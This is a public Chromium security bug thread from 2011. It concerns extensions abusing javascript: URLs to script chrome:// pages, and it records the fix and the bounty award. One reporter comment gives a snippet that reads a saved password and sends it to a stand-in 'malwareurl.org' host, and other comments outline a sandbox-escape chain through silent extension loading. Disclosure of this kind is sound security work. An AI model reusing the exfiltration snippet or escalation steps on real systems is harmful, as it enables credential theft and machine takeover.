# An extension can access and modify all chrome:// pages, options, etc.

| Field | Value |
|-------|-------|
| **Issue ID** | [40091029](https://issues.chromium.org/issues/40091029) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>Extensions |
| **Reporter** | tw...@googlemail.com |
| **Assignee** | se...@chromium.org |
| **Created** | 2011-05-18 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

An packaged app/extension can access and modify all chrome: pages, read/write preferences, run chrome.send function,  

pass arguments directly to c++,  

without required permissions,  

without using NPAPI plugin,  

content script or chrome.tabs.executeScript

**VERSION**  

Chrome Version:  

[11.0.696.68] [stable]  

[12.0.742.53] [beta]  

[13.0.767.1] [dev]

Operating System: [MS Windows Vista Home Premium Edition Service Pack 2 (build 6002), most likely affect all OS]

**REPRODUCTION CASE**

1. Add the following permissions in an app/extension manifest:  
   
   "permissions": ["tabs", "<all\_urls>"]
2. Call from any extension script:

chrome.tabs.create({url:'chrome://downloads/'}, function(tab) {  

onComplete() // wait when tab is complete  

chrome.tabs.update(tab.id, {url: 'javascript: document.styleSheets[0].addRule("\*","color:red;");'});  

});

Complete code: Hotcleaner\_Alpha\_Test.crx  

Look at bg.html line: 44-57

## Attachments

- [Hotcleaner_Alpha_Test.crx](attachments/Hotcleaner_Alpha_Test.crx) (application/octet-stream; charset=binary, 30.0 KB)

## Timeline

### [Deleted User] (2011-05-18)

Given that installing a malicious extension is required for this I think it's probably low severity. The only things you can really get with this that you couldn't from the all urls permission is maybe the saved passwords (although you could probably figure out a way to get these anyway).

This will be fixed when tsepez's CSP patch lands for chrome schemas given that the inline script directive covers javascript urls.

Erik, how do you feel about this one? 

### js...@chromium.org (2011-05-18)

The malicious extension seems like it can do essentially the same thing by design. So, I'm wondering if this should be severity-none and WontFix?

### [Deleted User] (2011-05-18)

Isn't this fixed by 77026?  We shouldn't be allowing you to navigate to a JS URL unless you have host permissions to that page.  <all_urls> shouldn't give you access to chrome:.  Mihai, I think you reviewed the fix for 77026, right?  Could you confirm?

### tw...@googlemail.com (2011-05-18)

All user paswords stored locally can be stealthed withiut any permission and send to malware site owner with just two lines of js code, for example:

1. chrome.tabs.create({url:'chrome://settings/passwords',
...
2. chrome.tabs.update(tab.id, {url:'javascript:var pass = document.getElementsByClassName("inactive-password")[0].value;alert(pass);window.open("malwareurl.org?"+pass,"malwareurl.org?"+pass);'});

Most likely, using this vulnerability an attacker may access any info stored on user's local file system. All chrome.send commands available for an attacker, including remoting and sync,
without any user's permissions!

I'm wondering that SecSeverity is assigned Low status. Affected all Chrome versions on all platforms. I'am not sure that none of > 20000 app/ext are not doing this right now.
SecSeverity is High.  

### [Deleted User] (2011-05-18)

It appears that Mihai is out today.  Antony, could you please investigate to verify whether 77026 was not a sufficient fix?

### sk...@chromium.org (2011-05-18)

I'm not comfortable with SecSeverity-Low: I know this requires a malicious extension, but it seems to me that an attacker that can script chrome://settings and chrome://extensions can completely compromise the machine:
1) Enable automatic downloads
2) Change download folder to a temporary folder
3) Download an unpacked extension to this folder.
4) Change download folder back to original path
5) Load unpacked extension from temporary folder.
The folder magic is needed because Chrome won't load extensions from the downloads folder but I expect that if you change it, it will load just fine. (I have not tested)

### [Deleted User] (2011-05-18)

It turns out that our fix for 77026 was incomplete.  That one was designated as SecSeverity-Medium, so this should be at least that.


### [Deleted User] (2011-05-18)

So I just wrote up a test for this and it is in fact possible to install an npapi extension in this way from another extension with tabs and all url permissions. I can see bumping this to medium severity given that this gets code running outside the sandbox. 

### tw...@googlemail.com (2011-05-18)

1) Create folder into sanboxed Filesystem (HTML5 API)
2) Using XMLHttpRequest, load into created folder extension files,
including NPAPI plugin!
3) Change download folder to filesistem://malwareext/ path
4) Load unpacked extension with NPAPI plugin (silently!)
I have checked this, extension is loading using this path. 

As a result full machine control through NPAPI plugin (as child chrome.exe proccess!).
I think SecSeverity should be high.  

### [Deleted User] (2011-05-18)

I agree, the sandbox escape definitely works but the fact that you have to get a malicious extension installed to achieve this limits the severity. I think medium is where we are right now but we are actively discussing this.

### as...@chromium.org (2011-05-19)

[Empty comment from Monorail migration]

### aa...@chromium.org (2011-05-19)

I think I see the issue. In the CL for https://crbug.com/chromium/77026 and related CLs, I tried to simplify this code and it looks like maybe I simplified away the check that excludes chrome:// URLs.

Apologies :-/.

### js...@chromium.org (2011-05-19)

[Empty comment from Monorail migration]

### [Deleted User] (2011-05-19)

twittermoo, just to be clear the fact that we are rating this medium severity does not nessecarily mean you won't receive a reward for the report. In fact I will nominate you . So if that is your concern don't worry :)

### [Deleted User] (2011-05-19)

[Empty comment from Monorail migration]

### tw...@googlemail.com (2011-05-20)

Thank you. It is very important to me and my product Click&Clean. 

There is one fear:
Currently, to Delete Browsing History in Chrome session,
Click&Clean ext. uses NPAPI plugin (win32) and the following approach:

1. Finds parent Chrome window, then child window handle (address bar) by class 
'Chrome_AutocompleteEditView' or 'Chrome_OmniboxView'

2. Then SendMessage(hwndOmnibox, WM_SETTEXT, NULL, L"javascript: ....");
...

Hope this opportunity will not be closed, in other words, javascript 
scheme should be closed for extensions/javascript access only, 
but not for scripting chrome:// pages trought address bar manually.

### bu...@chromium.org (2011-05-20)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=86164

------------------------------------------------------------------------
r86164 | asargent@chromium.org | Fri May 20 15:50:09 PDT 2011

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/common/extensions/extension_unittest.cc?r1=86164&r2=86163&pathrev=86164
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/common/extensions/extension.cc?r1=86164&r2=86163&pathrev=86164

Additional restrictions on kChromeUIScheme pages.

BUG=83010
TEST=See bug for more details

Review URL: http://codereview.chromium.org/7043023
------------------------------------------------------------------------

### [Deleted User] (2011-05-20)

@16 - Could you be a bit more specific in terms of what you need above the history.* API?  It would be better for us to add APIs to support your needs.


### tw...@googlemail.com (2011-05-21)

@18 At least the following methods should be very useful for all:
deleteRecenltyClosedTabs
deleteDownloadHistory
emptyTheCache
clearHostCache





### tw...@googlemail.com (2011-05-21)

Have found that hosted web app have access to chrome://newtab page and can call chrome.send:
getMostVisited
getRecentlyClosedTabs
getForeignSessions
openForeignSession
getApps
launchApp
uninstallApp
createAppShortcut
setLaunchType
...

REPRODUCTION CASE
1. Add the following web_url in an web app manifest:
"app": { "launch": { "web_url": "javascript:alert(chrome.send);" }}

Javascript code executes into newTab page context.

### [Deleted User] (2011-05-22)

@19 - filed as https://crbug.com/chromium/83530

@20 - javascript: in the "launch" URL was fixed a while back.  What version of Chrome are you seeing this in?


### tw...@googlemail.com (2011-05-23)

@21 
[11.0.696.68] - [stable] (Official Build 84545)
WebKit	534.24 (branches/chromium/696@85995)
MS Windows Vista Home Premium Edition Service Pack 2 (build 6002) 

### [Deleted User] (2011-05-23)

Thanks.  It should be resolved in Chrome 12.

### in...@chromium.org (2011-05-23)

Checked with Erik. We will merge r86164 to m12.

### [Deleted User] (2011-05-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-05-23)

hand merged to m12 in r86315. minor conflict in extensions.cc.

### bu...@chromium.org (2011-05-23)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=86315

------------------------------------------------------------------------
r86315 | inferno@chromium.org | Mon May 23 12:01:45 PDT 2011

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/742/src/chrome/common/extensions/extension_unittest.cc?r1=86315&r2=86314&pathrev=86315
 M http://src.chromium.org/viewvc/chrome/branches/742/src/chrome/common/extensions/extension.cc?r1=86315&r2=86314&pathrev=86315

Merge 86164
BUG=83010
Review URL: http://codereview.chromium.org/6966015
------------------------------------------------------------------------

### sc...@gmail.com (2011-06-01)

@twittermoo: thanks for the report. What name should we use to credit you?

### tw...@googlemail.com (2011-06-01)

You can use my real name Vladislavas Jarmalis
Thank you.

### sc...@gmail.com (2011-06-03)

@twittermoo: thanks for this bug! I'm happy to offer you a $1000 Chromium Security Reward! It's very unusual to reward Medium severity bugs at this level, but your demonstration of busting into chrome:// pages is compelling.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### tw...@googlemail.com (2011-06-03)

Very nice, thank you for Chromium Security Reward! 
You're awesome :) ! 
It will be good support for my Click&Clean project:
http://hotcleaner.com

P.S Who to contact about further details? 

### sc...@gmail.com (2011-06-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-06-07)

@twittermoo: thanks again!
Check out http://googlechromereleases.blogspot.com/2011/06/chrome-stable-release.html

To collect your reward, e-mail cevans@chromium.org

### sc...@gmail.com (2011-07-03)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/83010?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/chromium/83096]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091029)*
